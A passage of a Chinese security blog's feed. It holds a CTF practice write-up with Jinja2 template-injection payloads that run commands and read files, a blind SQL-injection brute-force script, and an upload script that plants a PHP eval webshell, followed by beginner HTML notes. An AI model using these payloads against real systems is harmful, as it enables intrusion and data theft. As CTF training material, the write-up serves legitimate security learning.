&#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112532522.png" alt="image-20220211112532522"></a></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112709595.png" alt="image-20220211112709595"></a></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112747491.png" alt="image-20220211112747491"></a></p><p>同理，可以利用的类还有很多啊，</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112931751.png" alt="image-20220211112931751"></a></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402142608573.png" alt="image-20220402142608573"></p><p>进去以后直接给你了sql语句。</p><p>先不管别的扫一下目录再说</p><p>发现xxx/robots.txt文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143249697.png" alt="image-20220402143249697"></p><p>再到hin.txt查看<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143334665.png" alt="image-20220402143334665"></p><p>给出了过滤得字符串，并且说的很明白如果得到admin得密码就可以得到flag，但是这里得过滤是非常严格得。</p><p>fuzz一下</p><p>发现regexp没有被过滤</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143542801.png" alt="image-20220402143542801"></p><p>sql语句是</p><pre><code>select * from users where username = &#39;&#39; and passwd = &#39;&#39;</code></pre><p>我们可以再username中加反斜杠注释掉单引号</p><pre><code>select * from users where username = &#39;aaa\&#39; and passwd = &#39;||/**/passwd/**/regexp/**/&quot;^a&quot;;%00&#39;</code></pre><p>对a进行一个简单得fuzz，判断成功时得响应包</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160348046.png" alt="image-20220402160348046"></p><p>发现y，响应包是一个302跳转，到welcome.php</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160421355.png" alt="image-20220402160421355"></p><p>根据这个就可以编写出payload</p><pre><code class="python">import timeimport requestsimport stringfrom urllib import parseres = &#39;&#39;url = &#39;http://494b5c51-766a-475c-b86d-320809ca2d50.node4.buuoj.cn:81/index.php&#39;string = string.digits + string.ascii_lowercase + &#39;_&#39; # 猜测密码由数字，小写字母和下划线组成for i in range(0, 200):    for s in string:        data = &#123;            &quot;username&quot;: &quot;sakura\\&quot;,            &quot;passwd&quot;: &quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format((res+s), parse.unquote(&#39;%00&#39;))        &#125;        response = requests.post(url, data)        print(response)        time.sleep(0.5)        if &quot;welcome&quot; in response.text:            res = res + s            print(res)        else:            continue</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130031558.png" alt="image-20220403130031558"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130154421.png" alt="image-20220403130154421"></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>进去直接显示这个</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130428719.png" alt="image-20220403130428719"></p><p>查看源代码，疑似hash长度扩展攻击</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130441800.png" alt="image-20220403130441800"></p><p>抓取请求包，发现hash值</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403131445202.png" alt="image-20220403131445202"></p><p>直接pass传一下，发现提示文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132151777.png" alt="image-20220403132151777"></p><p>发现文件包含</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132341966.png" alt="image-20220403132341966"></p><p>扫一下目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403140421790.png" alt="image-20220403140421790"></p><p>读取下源码</p><p>index.php</p><pre><code class="php">&lt;?phpinclude &#39;config.php&#39;;@$name=$_GET[&#39;name&#39;];@$pass=$_GET[&#39;pass&#39;];if(md5($secret.$name)===$pass)&#123;    echo &#39;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;flflflflag.php&quot;;    &lt;/script&gt;&#39;;&#125;else&#123;    setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);    echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt;</code></pre><p>flflflflag.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>config.php</p><pre><code class="php">&lt;?php$secret=&#39;%^$&amp;$#fffdflag_is_not_here_ha_ha&#39;;?&gt;</code></pre><p>dir.php</p><pre><code class="php">&lt;?phpvar_dump(scandir(&#39;/tmp&#39;));?&gt;</code></pre><p>由于伪协议被过滤，所以我们不能利用伪协议进行写马，这里考察得是php临时文件包含</p><p>php7 segment fault特性:<br>php://filter/string.strip_tags=/etc/passwd<br>php执行过程中出现 Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除</p><p>具体可参阅文章:<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>payload:</p><pre><code>import requestsfrom io import BytesIOurl = &#39;http://bcd936cd-a002-414f-ba12-3fabf74c16ae.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;payload = &quot;&lt;?php eval($_POST[&#39;x&#39;]) ?&gt;&quot;files = &#123;    &quot;file&quot;: BytesIO(payload.encode())&#125;try:    requests.post(url=url, files=files, allow_redirects=False)except:    print(&quot;false&quot;)</code></pre><p>查看dir.php，成功写入文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403144556928.png" alt="image-20220403144556928"></p><p>执行一句话木马，flag在phpinfo中</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145618596.png" alt="image-20220403145618596"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145643489.png" alt="image-20220403145643489"></p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150038070.png" alt="image-20220403150038070"></p><p>没有什么发现，尝试访问下secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150107744.png" alt="image-20220403150107744"></p><p>那我就把secret当作参数，传入一个值试一试</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150322198.png" alt="image-20220403150322198"></p><p>很明显，它把我输入得值进行了一个加密</p><p>没有什么发现，随便输入一些字符串，它就爆错了，，，</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150432386.png" alt="image-20220403150432386"></p><p>寻找可利用的信息</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150631904.png" alt="image-20220403150631904"></p><p>找到了加密方式是RC4,存在render，应该是模板注入</p><p>这是一个RC4加密脚本</p><pre><code>import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    # print(&quot;RC4加密主函数&quot;)    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可    # print(&quot;原来的 s 盒：%s&quot; % s_box)    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)    return s_boxdef rc4_excrypt(plain, box):    # print(&quot;调用加密程序成功。&quot;)    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    # print(&quot;res用于加密字符串，加密后是：%res&quot; %res)    cipher = &quot;&quot;.join(res)    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))    #print(&quot;加密后的输出(经过编码):&quot;)    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;&quot;)</code></pre><p>首先列出所有子类</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151137684.png" alt="image-20220403151137684"></p><p>传给secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151206120.png" alt="image-20220403151206120"></p><p>寻找可利用子类</p><p>给出一个脚本</p><p>find.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;subprocess.Popen&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>寻找warnings.catch_warnings类</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152312044.png" alt="image-20220403152312044"></p><p>payload</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__['__builtins__']['open']('/flag').read()&#125;&#125;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152255110.png" alt="image-20220403152255110"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;题目列表&quot;&gt;&lt;a href=&quot;#题目列表&quot; class=&quot;headerlink&quot; title=&quot;题目列表&quot;&gt;&lt;/a&gt;题目列表&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Web方向：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[b01lers2020]Welco</summary>
      
    
    
    
    <category term="CTF，刷题" scheme="https://sakurahack-y.github.io/categories/CTF%EF%BC%8C%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="https://sakurahack-y.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>html学习笔记</title>
    <link href="https://sakurahack-y.github.io/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-03-24T07:11:45.000Z</published>
    <updated>2022-03-26T16:51:46.402Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="简单的HTML页面架构"><a href="#简单的HTML页面架构" class="headerlink" title="简单的HTML页面架构"></a>简单的HTML页面架构</h1><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;charset  编码 gbk gbk2312 utf-8</code></pre><h1 id="HTML常见标签"><a href="#HTML常见标签" class="headerlink" title="HTML常见标签"></a>HTML常见标签</h1><h2 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h2><pre><code class="html">&lt;meta&gt; 元素可提供有关页面的元信息（meta-information），比如针对搜索引擎和更新频度的描述和关键词。设置网站关键字meta name=&quot;keywords&quot; content=&quot;网络安全，WEB渗透，数据安全，渗透测试，安全培训&quot; /&gt;&lt;link&gt; 标签定义文档与外部资源的关系。&lt;script&gt; 引入js文件注释&lt;!--这是一段注释。注释不会在浏览器中显示。--&gt;&lt;p&gt;这是一段普通的段落。&lt;/p&gt;</code></pre><p>简单demo</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;这里是sakura的博客&lt;/title&gt;        &lt;meta name=&quot;keywords&quot; content=&quot;网络安全，渗透测试，代码审计&quot;/&gt;        &lt;meta name=&quot;description&quot; content=&quot;这是sakura的博客，分享自己的学习经验&quot; /&gt;        &lt;meta name=&quot;author&quot; content=&quot;sakura&quot; /&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>效果图:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154159328.png" alt="image-20220324154159328"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154219201.png" alt="image-20220324154219201"></p><h2 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h2><pre><code class="html">由大到小&lt;h1&gt;h1&lt;/h1&gt;&lt;h2&gt;h2&lt;/h2&gt;&lt;h3&gt;h3&lt;/h3&gt;&lt;h4&gt;h4&lt;/h4&gt;&lt;h5&gt;h5&lt;/h5&gt;&lt;h6&gt;6&lt;/h6&gt;&lt;/br&gt; 换行标签&lt;hr&gt;换行线标签</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155054152.png" alt="image-20220324155054152"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155038536.png" alt="image-20220324155038536"></p><h2 id="文本属性"><a href="#文本属性" class="headerlink" title="文本属性"></a>文本属性</h2><pre><code class="html">&lt;strong&gt;加粗&lt;/strong&gt;&lt;b&gt;&lt;/b&gt;加粗&lt;i&gt;&lt;/i&gt;斜体&lt;u&gt;&lt;/u&gt; 下划线&lt;sup&gt;&lt;/sup&gt;上标&lt;sub&gt;&lt;/sub&gt;下标&lt;del&gt;&lt;/del&gt; 删除线&lt;font&gt;&lt;/font&gt; 规定字体属性    size 字体的大小    color 字体颜色    代码样式原样输出&lt;pre&gt;&lt;/pre&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324163340955.png" alt="image-20220324163340955"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324162943229.png" alt="image-20220324162943229"></p><h2 id="form表单"><a href="#form表单" class="headerlink" title="form表单"></a>form表单</h2><p>form表单 规定当提交表单时向何处发送表单数据</p><p>method 提交的方法有 get、post</p><p>规定在发送表单数据之前如何对其进行编码：</p><p><strong>enctype 属性可能的值：</strong></p><p>​        application/x-www-form-urlencoded</p><p>​        multipart/form-data</p><p>​        text/plain</p><p><strong>input标签:</strong></p><p>name：同样是表示的该文本输入框名称。</p><p>size：输入框的长度大小。</p><p>maxlength：输入框中允许输入字符的最大数。</p><p>value：输入框中的默认值</p><p>readonly：表示该框中只能显示，不能添加修改。</p><p><strong>input的类型:</strong></p><p>type=password 密码输入框</p><p>type=file 文件上传</p><p>type=hidden 隐藏域</p><p>button 按钮</p><p>checkbox 复选框</p><p>radio 单选框</p><p>type=submit 提交按钮</p><p>type=reset  重置按钮</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;这是一个表单e&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;            &lt;label&gt;用户名: &lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; size=&quot;30&quot; maxlength=&quot;6&quot; value=&quot;sakura&quot; readonly=&quot;&quot; /&gt;&lt;/br&gt;            &lt;label&gt;密&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;码:&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;  /&gt;&lt;/br&gt;            &lt;label&gt;技&amp;nbsp;能:&lt;/label&gt;安全开发&lt;input type=&quot;checkbox&quot; /&gt;渗透测试&lt;input type=&quot;checkbox&quot; /&gt;&lt;/br&gt;            &lt;label&gt;性&amp;nbsp;别:&lt;/label&gt;男&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;1&quot; /&gt;女&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;2&quot; /&gt;            &lt;input type=&quot;hidden&quot; value=&quot;1&quot; /&gt;&lt;/br&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;            &lt;input type=&quot;reset&quot; value=&quot;重置&quot; /&gt;            &lt;input type=&quot;button&quot; value=&quot;button&quot; /&gt;        &lt;/form&gt;        &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;            &lt;input type=&quot;file&quot; value=&quot;file&quot; /&gt;            &lt;input type=&quot;submit&quot; /&gt;        &lt;/form&gt;            &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324210305845.png" alt="image-20220324210305845"></p><h2 id="a标签、img标签、table标签"><a href="#a标签、img标签、table标签" class="headerlink" title="a标签、img标签、table标签"></a>a标签、img标签、table标签</h2><pre><code class="html">a标签的作用：就是用于控制界面与页面之间的跳转默认就是selfself：用于在当前选项卡中跳转，也就是不新建页面跳转_blank ：用于在新的选项卡中跳转，也就是新建页面跳转&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;self&quot;&gt;百度&lt;/a&gt;&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;百度&lt;/a&gt;_blank    在新窗口中打开被链接文档。_self    默认。在相同的框架中打开被链接文档。_parent    在父框架集中打开被链接文档。_top    在整个窗口中打开被链接文档。</code></pre><h2 id="锚文本"><a href="#锚文本" class="headerlink" title="锚文本"></a>锚文本</h2><pre><code class="html">&lt;a name=&quot;top&quot;&gt;锚点&lt;/a&gt;&lt;a href=&quot;#top&quot;&gt;锚点&lt;/a&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212519652.png" alt="image-20220324212519652"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212536673.png" alt="image-20220324212536673"></p><h2 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h2><pre><code class="html">img 元素向网页中嵌入一幅图像。&lt;img src=&quot;img/sakura.jpg&quot; width=&quot;400&quot; height=&quot;500&quot; alt=&quot;logo&quot;/&gt;alt 规定图像的替代文本。src  规定显示图像的urlwidth 规定图片的高度height 规定图片的宽度</code></pre><p>  <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324213845918.png" alt="image-20220324213845918"></p><h2 id="table表格"><a href="#table表格" class="headerlink" title="table表格"></a>table表格</h2><pre><code class="html">&lt;caption&gt;我的标题&lt;/caption&gt;表格带标题border 边框width 宽度height 高度colspan 合并行rowspan 合并竖&lt;th&gt;&lt;/th&gt; 定义表格内的表头单元格&lt;tr&gt;行&lt;/tr&gt;&lt;td&gt;表格&lt;/td&gt;cellpadding 单元边与内容的空白cellspacing 单元格的空白</code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;table border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;10&quot;&gt;            &lt;caption&gt;HY和WYF❤&lt;/caption&gt;            &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;年龄&lt;/th&gt;&lt;th&gt;在一起时间&lt;/th&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;HY&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;td rowspan=&quot;2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;299天&lt;/td&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;WYF&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;/tr&gt;        &lt;/table&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324220335722.png" alt="image-20220324220335722"></p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><pre><code class="html">&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><pre><code class="html">    项目符号 square circle disc&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324221810168.png" alt="image-20220324221810168"></p><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><pre><code class="html">    数字列表 默认 数字    小写字母列表     大写字母列表 A    罗马字母列表  I    小写罗马字母列表 i&lt;ol type=&quot;1&quot;&gt; &lt;!--有序列表--&gt;            &lt;li&gt;暗月实战项目九 不出网的情况下的内网多域控渗透&lt;/li&gt;            &lt;li&gt;xp/2003开关3389指令&lt;/li&gt;            &lt;li&gt;一条命令修改windows注册表&lt;/li&gt;&lt;/ol&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324222526957.png" alt="image-20220324222526957"></p><h2 id="框架使用"><a href="#框架使用" class="headerlink" title="框架使用"></a>框架使用</h2><p><strong>frameset 元素可定义一个框架集。它被用来组织多个窗口（框架）。每个框架存有独立的文档。在其最简单的应用中，frameset 元素仅仅会规定在框架集中存在多少列或多少行。您必须使用 cols 或 rows 属性。</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/clip_image002.png" alt="布局"></p><p>frameset 在一个页面中设置一个或多个框架 不能嵌套在body标签里</p><p>iframe 是在html页面内嵌入框架 框架内可以连接另一个页面</p><p> <strong>frameset属性:</strong></p><p>①border</p><p>设置框架的边框粗细。</p><p>②bordercolor</p><p>设置框架的边框颜色。</p><p>③frameborder</p><p>设置是否显示框架边框。设定值只有0、1；0 表示不要边框，1 表示要显示边框。</p><p>④cols</p><p>纵向分割页面。其数值表示方法有三种：“30%、30（或者30px）、<em>”；数值的个数代表分成的视窗数目且数值之间用“,”隔开。“30%”表示该框架区域占全部浏览器页面区域的30%；“30”表示该区域横向宽度为30像素；“</em>”表示该区域占用余下页面空间。例如：cols=”25%,200,*” 表示将页面分为三部分，左面部分占页面30%，中间横向宽度为200像素，页面余下的作为右面部分。</p><p>⑤rows</p><p>横向分割页面。数值表示方法与意义与cols相同。</p><p>⑥framespacing</p><p>设置框架与框架间的保留的空白距离。</p><p> <strong>frame属性:</strong></p><p>①name</p><p>设置框架名称。此为必须设置的属性。</p><p>②src</p><p>设置此框架要显示的网页名称或路径。此为必须设置的属性。</p><p>③scrolling</p><p>设置是否要显示滚动条。设定值为auto, yes, no。</p><p>auto 在需要的情况下出现滚动条（默认值）</p><p>yes 始终显示滚动条（即使不需要）</p><p>no  从不显示滚动条（即使需要）</p><p>④bordercolor</p><p>设置框架的边框颜色。</p><p>⑤frameborder</p><p>设置是否显示框架边框。设定值只有0、1；0 表示不要边框，1 表示要显示边框。</p><p>⑥noresize</p><p>设置框架大小是否能手动调节。</p><p>⑦marginwidth</p><p>设置框架边界和其中内容之间的宽度。</p><p>⑧marginhight</p><p>设置框架边界和其中内容之间的高度。</p><p>⑨width</p><p>设置框架宽度。</p><p>⑩height</p><p>设置框架高度。</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235313862.png" alt="image-20220324235313862"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235247186.png" alt="image-20220324235247186"></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    